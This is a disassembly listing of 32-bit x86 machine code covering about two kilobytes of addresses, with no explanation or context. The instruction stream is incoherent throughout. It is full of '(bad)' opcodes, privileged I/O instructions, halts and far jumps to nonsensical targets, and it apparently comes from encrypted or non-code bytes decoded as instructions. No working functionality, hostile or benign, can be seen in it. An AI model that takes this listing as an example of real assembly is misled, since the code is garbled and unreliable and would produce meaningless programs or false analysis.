  41391b:	mov    al,0x2f
  41391d:	jno    0x413930
  41391f:	cdq    
  413920:	leave  
  413921:	jle    0x413908
  413923:	repnz icebp 
  413925:	adc    dl,BYTE PTR [edx]
  413927:	aas    
  413928:	mov    cl,0x8b
  41392a:	das    
  41392b:	pop    edi
  41392c:	sub    eax,0x3de3e99c
  413931:	out    0x72,eax
  413933:	repnz cwde 
  413935:	aaa    
  413936:	inc    ebp
  413937:	dec    eax
  413938:	adc    BYTE PTR [eax+0x698c1c6],0x82
  41393f:	inc    edx
  413941:	push   ebp
  413942:	and    ecx,ebp
  413944:	or     al,0x21
  413946:	push   edi
  413947:	add    ebx,edx
  413949:	inc    ebx
  41394a:	mov    esp,0xb778ff69
  41394f:	sub    ebx,DWORD PTR [ebx+0x2b97dd19]
  413955:	mov    ebx,edi
  413957:	ja     0x413912
  413959:	int3   
  41395a:	dec    edi
  41395b:	jmp    0x4139cf
  41395d:	mov    ecx,0x75d73fe6
  413962:	fwait
  413963:	out    0x7d,eax
  413965:	mov    esp,0x3dd944aa
  41396a:	add    DWORD PTR [eax-0x15],esi
  41396d:	adc    eax,0xe800730b
  413972:	xchg   ecx,eax
  413973:	cmc    
  413974:	cwde   
  413975:	or     BYTE PTR [esi+0x603c547d],ah
  41397b:	mov    al,ds:0x3abd27e8
  413980:	adc    al,0x85
  413982:	daa    
  413983:	inc    esp
  413984:	dec    esi
  413985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413986:	add    BYTE PTR [ebp+0x48],ah
  413989:	push   0xfffffffd
  41398b:	cld    
  41398c:	cs sti 
  41398e:	push   0x8a753bb3
  413993:	test   al,0x25
  413995:	loope  0x4139aa
  413997:	loop   0x41391f
  413999:	call   0x5bdc8396
  41399e:	je     0x4139f8
  4139a0:	jo     0x413a12
  4139a2:	pop    es
  4139a3:	(bad)  
  4139a4:	dec    esi
  4139a5:	retf   0x6886
  4139a8:	pop    ecx
  4139a9:	mov    BYTE PTR [edi+0x4e0bb8e5],ch
  4139af:	je     0x4139d8
  4139b1:	sub    al,0xe1
  4139b3:	into   
  4139b4:	adc    DWORD PTR es:[esi],edx
  4139b7:	(bad)
  4139ba:	dec    esi
  4139bb:	xchg   esi,eax
  4139bc:	or     eax,0x1ba8f826
  4139c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c2:	ja     0x4139e0
  4139c4:	inc    esp
  4139c5:	(bad)  
  4139c6:	std    
  4139c7:	out    0xd9,eax
  4139c9:	jb     0x4139ef
  4139cb:	dec    ebp
  4139cc:	inc    edi
  4139cd:	cmp    DWORD PTR [ebp-0x6e],esi
  4139d0:	xchg   edx,eax
  4139d1:	mov    al,dh
  4139d3:	call   0xcfc:0xd1c41af3
  4139da:	jno    0x413991
  4139dc:	inc    eax
  4139dd:	icebp  
  4139de:	ins    BYTE PTR es:[edi],dx
  4139df:	test   eax,0xcade4fd0
  4139e4:	aas    
  4139e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139e6:	sub    esp,DWORD PTR [esi+0x600e170c]
  4139ec:	xor    eax,0x4361c4e6
  4139f1:	sub    BYTE PTR [edi-0x336bf066],al
  4139f7:	adc    BYTE PTR ds:0x7ce9fd55,dl
  4139fd:	pop    ss
  4139fe:	(bad)  
  4139ff:	imul   ebp,DWORD PTR [ecx+ebx*8+0x63270e0d],0xffffffa7
  413a07:	add    eax,0x284a90b5
  413a0c:	mov    ds:0xc86ecb3e,al
  413a11:	lods   eax,DWORD PTR ds:[esi]
  413a12:	imul   eax,ebp,0xd5879415
  413a18:	pop    ecx
  413a19:	and    al,0xd9
  413a1b:	fwait
  413a1c:	mov    dh,0xca
  413a1e:	addr16 dec ebx
  413a20:	rol    ah,1
  413a22:	xor    eax,0x8bd165f9
  413a27:	xchg   edi,eax
  413a28:	pop    esp
  413a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2a:	sbb    esp,0xffffffc1
  413a2d:	xor    al,0xd
  413a2f:	mov    al,ds:0x1e175288
  413a34:	mov    ecx,0x8be3c8fd
  413a39:	popa   
  413a3a:	add    DWORD PTR [ebp+0x10f99aea],esi
  413a40:	std    
  413a41:	stc    
  413a42:	cmp    esp,esi
  413a44:	hlt    
  413a45:	bswap  esp
  413a47:	fnstsw WORD PTR [edx-0xb]
  413a4a:	mov    ds:0x6aa5fed5,al
  413a4f:	mov    al,0x49
  413a51:	dec    esi
  413a52:	mov    BYTE PTR [ebx+0x44],bh
  413a55:	push   edi
  413a56:	out    dx,eax
  413a57:	sub    al,0xae
  413a59:	outs   dx,BYTE PTR ds:[esi]
  413a5a:	outs   dx,DWORD PTR ds:[esi]
  413a5b:	mov    ebp,0x6da22796
  413a60:	lods   eax,DWORD PTR ds:[esi]
  413a61:	push   ss
  413a62:	sub    esp,DWORD PTR [edx+0x16]
  413a65:	cmp    BYTE PTR [eax+0x62d001b9],ah
  413a6b:	loope  0x413abe
  413a6d:	mov    ds:0xfb30d2ec,al
  413a72:	inc    ebx
  413a73:	lods   al,BYTE PTR ds:[esi]
  413a74:	imul   ecx,ebx,0x2cb90dbe
  413a7a:	cwde   
  413a7b:	jmp    0x3bbd:0xe13a7789
  413a82:	sub    eax,0x30312063
  413a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a88:	mov    ebx,0x3070de00
  413a8d:	jne    0x413adb
  413a8f:	imul   ebx,DWORD PTR [eax-0x53],0xc5d44399
  413a96:	sbb    edi,DWORD PTR [ebx-0x63]
  413a99:	push   edx
  413a9a:	adc    esp,ebp
  413a9c:	inc    DWORD PTR [edx+ebp*2+0x1488e0c5]
  413aa3:	xchg   esi,eax
  413aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aa5:	pop    ecx
  413aa6:	jmp    0x8bc6e1b7
  413aab:	pop    esi
  413aac:	mov    BYTE PTR [eax+ebp*4-0x11],al
  413ab0:	gs pop ecx
  413ab2:	fwait
  413ab3:	imul   edi,edi,0xb3f5f65f
  413ab9:	lock mov dl,0x83
  413abc:	(bad)  
  413abd:	pop    esi
  413abe:	mov    al,0x35
  413ac0:	dec    edi
  413ac1:	and    DWORD PTR [ebp+0x60],ecx
  413ac4:	ret    
  413ac5:	mov    ds,ebx
  413ac7:	repz loope 0x413a94
  413aca:	mov    esi,DWORD PTR [eax-0x67]
  413acd:	pop    ebx
  413ace:	loop   0x413a5c
  413ad0:	cld    
  413ad1:	and    eax,0x2f4f65a8
  413ad6:	mov    BYTE PTR [ecx*8+0x4897740b],cl
  413add:	ja     0x413ae5
  413adf:	sub    DWORD PTR [eax+ebx*1],edx
  413ae2:	pmaxub mm3,QWORD PTR [eax+0x15041290]
  413ae9:	pop    ds
  413aea:	sub    esi,ebp
  413aec:	pop    edi
  413aed:	hlt    
  413aee:	sub    eax,0x3e6841a3
  413af3:	not    BYTE PTR [ecx]
  413af5:	lods   eax,DWORD PTR ds:[esi]
  413af6:	lock push ecx
  413af8:	fidiv  DWORD PTR [edi-0x7c]
  413afc:	enter  0xa6b7,0x71
  413b00:	clc    
  413b01:	sahf   
  413b02:	mov    esi,0x20c78382
  413b07:	ror    BYTE PTR [ebp-0x21410c27],0x5d
  413b0e:	xchg   edx,eax
  413b0f:	imul   ebp,DWORD PTR [eax+0x4e],0x4f
  413b13:	popa   
  413b14:	retf   0x97c3
  413b17:	jge    0x413b08
  413b19:	outs   dx,BYTE PTR ds:[esi]
  413b1a:	mov    ebx,0x606ff6ca
  413b1f:	scas   al,BYTE PTR es:[edi]
  413b20:	sub    ah,BYTE PTR [ecx+ecx*2-0x32]
  413b24:	mov    eax,0x4b832964
  413b29:	and    eax,0x226e9b19
  413b2e:	jmp    0x413b5d
  413b30:	inc    ebp
  413b31:	leave  
  413b32:	jp     0x413bb3
  413b34:	call   0x59f0:0xc68f729b
  413b3b:	mov    ds:0x311d9e36,al
  413b40:	ins    BYTE PTR es:[edi],dx
  413b41:	adc    DWORD PTR [ecx+ecx*4+0xf8dd4c0],0x5
  413b49:	sti    
  413b4a:	sub    DWORD PTR [edi+0x57],ecx
  413b4d:	(bad)  
  413b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b4f:	push   edi
  413b50:	ins    BYTE PTR es:[edi],dx
  413b51:	ins    BYTE PTR es:[edi],dx
  413b52:	stc    
  413b53:	iret   
  413b54:	mov    BYTE PTR ds:0x4e619f16,bh
  413b5a:	jbe    0x413b4a
  413b5c:	dec    esi
  413b5d:	sub    BYTE PTR [ebx-0x19b578d],bh
  413b63:	psubsw mm5,mm2
  413b66:	pop    ebp
  413b67:	push   ds
  413b68:	scas   al,BYTE PTR es:[edi]
  413b69:	dec    esi
  413b6a:	sbb    al,BYTE PTR [ecx]
  413b6c:	repnz adc ch,0x6e
  413b70:	xchg   edi,eax
  413b71:	inc    DWORD PTR [ebx+0x7ec72816]
  413b77:	mov    WORD PTR [ebx+0x3c],?
  413b7a:	add    BYTE PTR [edx-0x761992f8],al
  413b80:	pop    ebp
  413b81:	rcr    DWORD PTR [edx],cl
  413b83:	dec    ebp
  413b84:	into   
  413b85:	dec    ebx
  413b86:	cmp    esi,eax
  413b88:	rcr    DWORD PTR [esi],0x41
  413b8b:	arpl   WORD PTR [ebx],si
  413b8d:	icebp  
  413b8e:	jmp    0xfd62:0x6e510148
  413b95:	shr    DWORD PTR [ecx],1
  413b97:	jo     0x413b3a
  413b99:	dec    eax
  413b9a:	jb     0x413bea
  413b9c:	mov    dh,0x77
  413b9e:	outs   dx,BYTE PTR ds:[esi]
  413b9f:	mov    bh,0x95
  413ba1:	loop   0x413b4f
  413ba3:	lahf   
  413ba4:	or     bh,BYTE PTR [ebp-0x7e]
  413ba7:	data16 mov cl,0x78
  413baa:	retf   0xf16c
  413bad:	call   0x6d13e43b
  413bb2:	nop
  413bb3:	sbb    DWORD PTR [ecx],ebx
  413bb5:	pop    esi
  413bb6:	mov    al,0xfd
  413bb8:	pop    esp
  413bb9:	lea    ecx,[ebp-0x1fc199d6]
  413bbf:	jbe    0x413b59
  413bc1:	pop    edx
  413bc2:	mul    edx
  413bc4:	inc    ebp
  413bc5:	icebp  
  413bc6:	int3   
  413bc7:	test   DWORD PTR [edi-0x610a07e3],edx
  413bcd:	adc    DWORD PTR [eax-0x28ca7dc6],esp
  413bd3:	jmp    0xa79b3f62
  413bd8:	add    bh,BYTE PTR [esi-0x10]
  413bdb:	sub    bl,ch
  413bdd:	scas   eax,DWORD PTR es:[edi]
  413bde:	fucomi st,st(3)
  413be0:	inc    ecx
  413be1:	sti    
  413be2:	adc    al,0xcd
  413be4:	push   cs
  413be5:	push   ecx
  413be6:	hlt    
  413be7:	aad    0xe5
  413be9:	fdiv   QWORD PTR [eax+edx*1+0x75]
  413bed:	mov    BYTE PTR [eax-0x31],bl
  413bf0:	lods   al,BYTE PTR ds:[esi]
  413bf1:	hlt    
  413bf2:	push   edi
  413bf3:	mov    bh,ch
  413bf5:	pop    esi
  413bf6:	jle    0x413c49
  413bf8:	mov    cl,0x9c
  413bfa:	jge    0x413c0b
  413bfc:	xor    eax,DWORD PTR [esi+0x3a]
  413bff:	push   esp
  413c00:	fnstcw WORD PTR [ebx+0xc]
  413c03:	mov    eax,0x1bdebd1d
  413c08:	iret   
  413c09:	xor    BYTE PTR [ebx-0x1e2f93a7],bh
  413c0f:	fldcw  WORD PTR [ebx-0x71ac79e7]
  413c15:	and    bh,BYTE PTR [edx-0x64]
  413c18:	lods   eax,DWORD PTR ds:[esi]
  413c19:	push   esi
  413c1a:	popf   
  413c1b:	sub    al,0x73
  413c1d:	mov    bh,0xad
  413c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c20:	dec    ebx
  413c21:	stos   DWORD PTR es:[edi],eax
  413c22:	add    edx,ebp
  413c24:	inc    eax
  413c25:	(bad)  
  413c26:	mov    ebx,0x650de748
  413c2b:	add    eax,0x32b54845
  413c30:	popf   
  413c31:	das    
  413c32:	and    ebx,ebx
  413c34:	js     0x413be5
  413c36:	loop   0x413c95
  413c38:	or     al,0xb6
  413c3a:	and    DWORD PTR [edx],ebp
  413c3c:	cmp    BYTE PTR [ebx+0x6d],0xfc
  413c40:	mov    ecx,0x25c28286
  413c45:	jecxz  0x413c53
  413c47:	mov    al,0xb1
  413c49:	int3   
  413c4a:	icebp  
  413c4b:	loopne 0x413ca0
  413c4d:	(bad)  
  413c4e:	mov    ch,0x3b
  413c50:	paddsw mm6,QWORD PTR [edi+0x58]
  413c54:	mov    ch,0x62
  413c56:	jae    0x413c9f
  413c58:	shl    DWORD PTR [edi-0x5b7dec2b],1
  413c5e:	inc    DWORD PTR [ebp+0x78cf8899]
  413c64:	rcr    DWORD PTR [ebp-0x25],cl
  413c67:	cs adc al,0x21
  413c6a:	pop    ebx
  413c6b:	inc    eax
  413c6c:	ins    DWORD PTR es:[edi],dx
  413c6d:	and    eax,0xd223d93a
  413c72:	test   BYTE PTR [edx-0x40],bl
  413c75:	stos   DWORD PTR es:[edi],eax
  413c76:	shl    BYTE PTR [ecx-0x4afb6a5f],1
  413c7c:	xchg   esi,eax
  413c7d:	xchg   DWORD PTR [edx+ebx*2],edi
  413c80:	adc    eax,0xbcd525d5
  413c85:	cmc    
  413c86:	mov    dh,0xb
  413c88:	mov    ebp,0xbbfc2402
  413c8d:	sbb    dh,BYTE PTR [edi-0x2fe7ece4]
  413c93:	jne    0x413cd5
  413c95:	pusha  
  413c96:	scas   eax,DWORD PTR es:[edi]
  413c97:	xor    DWORD PTR [edi-0x3af29337],ecx
  413c9d:	sub    DWORD PTR ds:0xf09cd72b,ebp
  413ca3:	mov    esi,0x1e4e460
  413ca8:	jno    0x413c7b
  413caa:	das    
  413cab:	dec    ebx
  413cac:	mov    bl,0x57
  413cae:	sub    BYTE PTR [ebx+0x49bcf024],cl
  413cb4:	iret   
  413cb5:	das    
  413cb6:	or     edx,0x73
  413cb9:	jp     0x413c95
  413cbb:	or     eax,0xfda4ceb
  413cc0:	fwait
  413cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cc2:	jbe    0x413cfe
  413cc4:	add    DWORD PTR [esi+edx*2+0x21a44c37],ebp
  413ccb:	adc    eax,0x7ab1227a
  413cd0:	mov    edi,0x397e8612
  413cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd6:	xor    DWORD PTR [ecx-0x21],ebp
  413cd9:	popf   
  413cda:	mov    ebp,0xf6e2029a
  413cdf:	call   0x9621b01f
  413ce4:	inc    eax
  413ce5:	loopne 0x413cb7
  413ce7:	sbb    ch,BYTE PTR [ecx-0x12]
  413cea:	dec    edx
  413ceb:	jmp    0x4a9ef5d3
  413cf0:	lahf   
  413cf1:	inc    edi
  413cf2:	or     bh,cl
  413cf4:	mov    dh,0x54
  413cf6:	in     al,dx
  413cf7:	(bad)  
  413cf8:	das    
  413cf9:	push   ebx
  413cfa:	add    ecx,DWORD PTR [edi]
  413cfc:	fwait
  413cfd:	test   DWORD PTR [ecx-0x7f],edi
  413d00:	lahf   
  413d01:	rcr    DWORD PTR [edx+0x66],0x38
  413d05:	fistp  DWORD PTR gs:[edx-0x2c]
  413d09:	or     al,0xb3
  413d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d0c:	(bad)  
  413d0d:	aaa    
  413d0e:	daa    
  413d0f:	pop    eax
  413d10:	jmp    0x413d49
  413d12:	jl     0x413cef
  413d14:	push   edi
  413d15:	sbb    ah,BYTE PTR [edi]
  413d17:	push   edi
  413d18:	push   ds
  413d19:	pop    edi
  413d1a:	mov    bh,0xfe
  413d1c:	cli    
  413d1d:	cmp    BYTE PTR [esi],0x81
  413d20:	mov    esp,0x99baddbc
  413d25:	sbb    BYTE PTR [eax-0x2b9fdcf8],dl
  413d2b:	call   0xe37efeb9
  413d30:	sbb    eax,0x5cda7315
  413d35:	cli    
  413d36:	ins    BYTE PTR es:[edi],dx
  413d37:	fisubr DWORD PTR [eax+0x68]
  413d3a:	jl     0x413d7b
  413d3c:	gs jl  0x413d5f
  413d3f:	pop    ebx
  413d40:	mov    al,0x81
  413d42:	int    0xf4
  413d44:	fistp  DWORD PTR [ebx]
  413d46:	test   BYTE PTR ds:0xa36a41f5,bl
  413d4c:	hlt    
  413d4d:	outs   dx,DWORD PTR ds:[esi]
  413d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4f:	dec    edi
  413d50:	and    dl,BYTE PTR [eax]
  413d52:	push   ss
  413d53:	scas   eax,DWORD PTR es:[edi]
  413d54:	scas   eax,DWORD PTR es:[edi]
  413d55:	mov    al,0x6c
  413d57:	xor    DWORD PTR [eax+0x58],esi
  413d5a:	pop    esi
  413d5b:	in     al,dx
  413d5c:	mov    dh,0x6c
  413d5e:	mov    al,BYTE PTR [esi+ebx*4+0x76828647]
  413d65:	inc    ecx
  413d66:	dec    esp
  413d67:	loopne 0x413d48
  413d69:	das    
  413d6a:	(bad)  
  413d6b:	(bad)  [eax+0x4b]
  413d6e:	sbb    ch,BYTE PTR [eax]
  413d70:	lahf   
  413d71:	popf   
  413d72:	cmp    DWORD PTR [esi+edx*8+0x6922302e],esi
  413d79:	push   edi
  413d7a:	push   cs
  413d7b:	fs ins DWORD PTR es:[edi],dx
  413d7d:	sub    eax,0x769883ac
  413d82:	add    al,cl
  413d84:	dec    ebp
  413d85:	out    dx,eax
  413d86:	test   DWORD PTR [edx+ebx*8],esi
  413d89:	xchg   ebp,eax
  413d8a:	imul   edx,DWORD PTR [eax+0x54f87b81],0x669f8c08
  413d94:	lock mov eax,ds:0x4da1f09e
  413d9a:	mov    esp,0xea8aa9bb
  413d9f:	icebp  
  413da0:	cli    
  413da1:	cmp    al,0x4a
  413da3:	pop    ebx
  413da4:	mov    BYTE PTR [eax+0x2e0317b2],dh
  413daa:	pop    ebx
  413dab:	lock and bl,BYTE PTR [ebp+0x27]
  413daf:	mov    al,0x4a
  413db1:	sbb    ch,BYTE PTR ds:0xbf4c0219
  413db7:	mov    al,ds:0x7650e4b8
  413dbc:	fbld   TBYTE PTR [esi-0x2c]
  413dbf:	cmc    
  413dc0:	pop    ebp
  413dc1:	sbb    BYTE PTR [eax+edx*4+0x3ba9bbf4],al
  413dc8:	mov    bl,0xa2
  413dca:	stos   DWORD PTR es:[edi],eax
  413dcb:	jmp    0xdedc0a14
  413dd0:	mov    dh,0xc5
  413dd2:	mov    ch,0xe5
  413dd4:	or     eax,0x7a750b32
  413dd9:	mov    esp,0x5997117c
  413dde:	xor    eax,0x7d7f41aa
  413de3:	daa    
  413de4:	repz cmp al,0xc0
  413de7:	sbb    al,0xeb
  413de9:	push   0x8acb0b7f
  413dee:	out    0x40,al
  413df0:	or     al,ch
  413df2:	jmp    0x413d8c
  413df4:	sub    BYTE PTR [ebp+0x6],dl
  413df7:	add    eax,0x4dd0ca59
  413dfc:	ret    0xff35
  413dff:	(bad)  
  413e01:	imul   esp,eax,0x7a7cc047
  413e07:	(bad)  
  413e08:	mov    esp,0xdddf3afa
  413e0d:	push   ss
  413e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e0f:	std    
  413e10:	(bad)  
  413e11:	cmp    BYTE PTR es:[ecx+0x252e6ed0],0x32
  413e19:	mov    al,0x5d
  413e1b:	push   eax
  413e1c:	(bad)  
  413e1d:	cmpps  xmm2,XMMWORD PTR ds:[ebp+0x6b086ec5],0xe8
  413e26:	sbb    cl,ah
  413e28:	adc    esi,DWORD PTR [ecx]
  413e2a:	push   ebp
  413e2b:	dec    edx
  413e2c:	adc    eax,0xe6d54677
  413e31:	retf   
  413e32:	mov    eax,0xd254d3b8
  413e37:	(bad)  
  413e38:	sahf   
  413e39:	ja     0x413dff
  413e3b:	push   ecx
  413e3c:	jecxz  0x413dd5
  413e3e:	push   ecx
  413e3f:	and    cl,BYTE PTR [esi]
  413e41:	push   es
  413e42:	(bad)  
  413e43:	ss jmp esp
  413e46:	sahf   
  413e47:	pop    edi
  413e48:	nop
  413e49:	stc    
  413e4a:	push   esp
  413e4b:	add    eax,0xd806e928
  413e50:	push   cs
  413e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e52:	sub    eax,0x80217e3e
  413e57:	or     dl,al
  413e59:	jo     0x413e5f
  413e5b:	stos   BYTE PTR es:[edi],al
  413e5c:	std    
  413e5d:	(bad)  
  413e5e:	int    0xd4
  413e60:	push   edx
  413e61:	stos   DWORD PTR es:[edi],eax
  413e62:	sub    al,0x2b
  413e64:	sbb    eax,0x5cda78b9
  413e69:	mov    ds:0x6a213700,al
  413e6e:	mov    WORD PTR [edi+0x45],es
  413e71:	mov    esi,0x718f71b3
  413e76:	fdivr  DWORD PTR [ebp-0x26]
  413e79:	cmp    ebp,DWORD PTR [edx+0x3463d095]
  413e7f:	lods   eax,DWORD PTR ds:[esi]
  413e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e81:	mov    DWORD PTR [ecx-0x68c5a9df],eax
  413e87:	dec    esi
  413e88:	nop
  413e89:	xchg   edx,eax
  413e8a:	int3   
  413e8b:	out    0xcf,al
  413e8d:	out    dx,eax
  413e8e:	je     0x413f08
  413e90:	fiadd  WORD PTR [edx]
  413e92:	sub    cl,cl
  413e94:	add    ebp,DWORD PTR [ebx-0x7c7b10a4]
  413e9a:	mov    ebp,0x6a55c39d
  413e9f:	or     eax,0xed919082
  413ea4:	aaa    
  413ea5:	lods   al,BYTE PTR ds:[esi]
  413ea6:	test   DWORD PTR [esi+0x0],edx
  413ea9:	(bad)  
  413eaa:	and    al,0xa1
  413eac:	loopne 0x413e79
  413eae:	test   al,0xdc
  413eb0:	push   0xffffffac
  413eb2:	test   BYTE PTR [ecx+ebx*8+0x21da6161],ah
  413eb9:	add    esp,eax
  413ebb:	and    bl,BYTE PTR [esi+ebp*1]
  413ebe:	and    edi,DWORD PTR [edx]
  413ec0:	mov    DWORD PTR [esi+eiz*4],0xb5ec0399
  413ec7:	cmp    bl,bl
  413ec9:	or     BYTE PTR [ebx+0x6f],ch
  413ecc:	jecxz  0x413f43
  413ece:	push   edi
  413ecf:	test   al,0x49
  413ed1:	data16 jne 0x413efa
  413ed4:	fstp   DWORD PTR [ebx]
  413ed6:	aam    0x18
  413ed8:	dec    ecx
  413ed9:	nop
  413eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413edb:	jmp    0x63b41f39
  413ee0:	(bad)  
  413ee1:	fidivr WORD PTR [edi+0x4]
  413ee4:	shr    BYTE PTR [edi],1
  413ee6:	int    0xae
  413ee8:	iret   
  413ee9:	push   edx
  413eea:	jmp    0x413f15
  413eec:	ja     0x413f12
  413eee:	test   eax,0xa2bb6bf8
  413ef3:	dec    ebp
  413ef4:	sbb    edi,DWORD PTR [eax+0x36]
  413ef7:	and    DWORD PTR [ebx],0xbb3dcb95
  413efd:	mov    cl,0xcc
  413eff:	sub    ebx,DWORD PTR [ebx-0x3a3a72c9]
  413f05:	(bad)  
  413f06:	sbb    bh,BYTE PTR [ecx]
  413f08:	sar    BYTE PTR [edi+ecx*2],1
  413f0b:	push   0x3466ae8a
  413f10:	and    eax,0x4ea1a871
  413f15:	imul   ecx,esp,0x41e2c240
  413f1b:	push   esi
  413f1c:	les    ecx,FWORD PTR [ebp-0x6ea00e83]
  413f22:	nop
  413f23:	jmp    0x4ba2:0x3f66cce7
  413f2a:	jmp    0xd1ec:0x2b75c3b4
  413f31:	int3   
  413f32:	mov    dl,0xa9
  413f34:	lock pop ebx
  413f36:	mov    dh,0xce
  413f38:	shl    BYTE PTR [ebx],0xd3
  413f3b:	arpl   WORD PTR [edx+0x7b],cx
  413f3e:	into   
  413f3f:	test   eax,0xf33bb54
  413f44:	sar    BYTE PTR [edi-0x64cbc496],0xc9
  413f4b:	and    ebp,ebp
  413f4d:	retf   0xa163
  413f50:	jmp    0x5a1450fe
  413f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f56:	sub    BYTE PTR [ebp-0x615f6ed3],bh
  413f5c:	fdivr  DWORD PTR [ebx-0x4ed5f8d4]
  413f62:	adc    dl,BYTE PTR [edi+0x7d2dc1e]
  413f68:	inc    ecx
  413f69:	mov    esp,0x25d0a4c7
  413f6e:	inc    ecx
  413f6f:	imul   edx,DWORD PTR [ecx],0x0
  413f72:	aas    
  413f73:	push   ebp
  413f74:	push   esp
  413f75:	js     0x413f7c
  413f77:	xor    cl,BYTE PTR ds:0x8b0b2757
  413f7d:	jp     0x413f6d
  413f7f:	xchg   esi,eax
  413f80:	or     bh,BYTE PTR [ebp-0x789905df]
  413f86:	mov    dh,0x19
  413f88:	and    al,0xcd
  413f8a:	push   cs
  413f8b:	out    0x3c,eax
  413f8d:	test   DWORD PTR [edx],ebx
  413f8f:	push   ds
  413f90:	stc    
  413f91:	xchg   ecx,eax
  413f92:	aas    
  413f93:	dec    ebp
  413f94:	fldenv [ecx-0x36]
  413f97:	inc    ecx
  413f98:	xchg   BYTE PTR [edx-0x79],ah
  413f9b:	mov    al,0x60
  413f9d:	xchg   ebx,eax
  413f9e:	aaa    
  413f9f:	lods   eax,DWORD PTR ds:[esi]
  413fa0:	xor    eax,ebx
  413fa2:	push   esp
  413fa3:	pop    ss
  413fa4:	fnstcw WORD PTR [eax+esi*4]
  413fa7:	sub    DWORD PTR [ebp+0x20],edx
  413faa:	mov    ebp,0xc030b069
  413faf:	lock test BYTE PTR [edi],dh
  413fb2:	mov    eax,0x6ec09a89
  413fb7:	mov    ds:0xf6f3cee,eax
  413fbc:	cdq    
  413fbd:	aad    0xca
  413fbf:	lods   al,BYTE PTR ds:[esi]
  413fc0:	mov    ch,0xd3
  413fc2:	call   0xa6d8:0x9d431c8e
  413fc9:	idiv   ch
  413fcb:	mov    dl,0xd4
  413fcd:	ss inc esp
  413fcf:	xor    esi,DWORD PTR [ecx+0x11474a8]
  413fd5:	daa    
  413fd6:	jo     0x413ffc
  413fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd9:	mov    WORD PTR [esi-0x761ac002],fs
  413fdf:	in     eax,0xa8
  413fe1:	or     eax,0xbeca0275
  413fe6:	mov    ah,0x92
  413fe8:	shl    BYTE PTR [edx+0x51],0xd6
  413fec:	or     eax,0x250b4f4a
  413ff1:	xchg   edi,eax
  413ff2:	push   ebx
  413ff3:	inc    eax
  413ff4:	rcr    DWORD PTR [edi-0x3b6006de],cl
  413ffa:	nop
  413ffb:	clc    
  413ffc:	imul   ecx,DWORD PTR [edx-0x1534ee2c],0x6b3738b8
  414006:	cld    
  414007:	(bad)  
  414008:	aam    0x90
  41400a:	fnsave [ebx+0x14]
  41400d:	neg    ch
  41400f:	sbb    eax,0xd0d4f29c
  414014:	or     eax,0xf158e521
  414019:	mov    esp,0x88a4e2c3
  41401e:	pop    ss
  41401f:	loope  0x413ff9
  414021:	das    
  414022:	or     bl,BYTE PTR [esi-0x6e]
  414025:	xchg   edx,eax
  414026:	iret   
  414027:	or     cl,BYTE PTR [edi+edx*1+0x18]
  41402b:	mov    ebx,0x8291c124
  414030:	xchg   esp,eax
  414031:	push   edx
  414032:	lods   eax,DWORD PTR ds:[esi]
  414033:	inc    edx
  414034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414035:	xchg   ebx,eax
  414036:	int    0x2
  414038:	lods   al,BYTE PTR ds:[esi]
  414039:	adc    DWORD PTR [esi+edi*8],edi
  41403c:	dec    eax
  41403d:	adc    esp,0xe2da8276
  414043:	sub    DWORD PTR [esi-0x35],0xfffffff0
  414047:	addr16 lahf 
  414049:	jmp    0x7accf35a
  41404e:	inc    esp
  41404f:	pop    ecx
  414050:	or     DWORD PTR [edi-0x4],esi
  414053:	out    0x2e,eax
  414055:	xor    eax,0x3fdbc74d
  41405a:	frstor [ebx+0x5e8dab77]
  414061:	out    0xd1,eax
  414063:	dec    ecx
  414064:	neg    DWORD PTR [ebx]
  414066:	mov    esp,es
  414068:	adc    al,0x5c
  41406a:	mov    cl,0x7e
  41406c:	rol    DWORD PTR [eax],1
  41406e:	and    al,0x83
  414070:	pop    edx
  414071:	cvttps2pi mm4,QWORD PTR [ebp+edx*8+0x4b]
  414076:	and    BYTE PTR [edi-0x4c],dl
  414079:	(bad)  
  41407a:	test   DWORD PTR [edx],0x79052588
  414080:	clc    
  414081:	ret    
  414082:	sub    eax,0x5a116982
  414087:	sbb    DWORD PTR [edx-0x16b1a62d],esp
  41408d:	out    0xd2,eax
  41408f:	jmp    0x4140f0
  414091:	mov    ch,0xa0
  414093:	and    ecx,ecx
  414095:	sub    ch,BYTE PTR ds:0x3574727e
  41409b:	retf   0xf156
  41409e:	mov    ebp,0x3eeb9523
  4140a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a4:	and    esp,DWORD PTR [ebx]
  4140a6:	inc    edx
  4140a7:	dec    edi
  4140a8:	mov    eax,0xd2b01267
  4140ad:	jle    0x41410e
  4140af:	xchg   ebp,eax
  4140b0:	rol    eax,0xb
  4140b3:	dec    ecx
  4140b4:	jno    0x4140de
  4140b6:	push   ebx
  4140b7:	stc    
  4140b8:	fnstsw WORD PTR [edx]
  4140ba:	leave  
  4140bb:	cld    
  4140bc:	dec    ecx
  4140bd:	inc    ecx
  4140be:	inc    si
  4140c0:	jbe    0x41413f
  4140c2:	adc    al,0xf4
  4140c4:	mov    bl,0x56
  4140c6:	mov    es,WORD PTR [ecx+0x7e]
  4140c9:	stc    
  4140ca:	shl    BYTE PTR [edi+0x58],cl
  4140cd:	(bad)  
  4140ce:	out    0x81,al
  4140d0:	test   al,0x0
  4140d2:	push   edx
  4140d3:	xchg   edx,eax
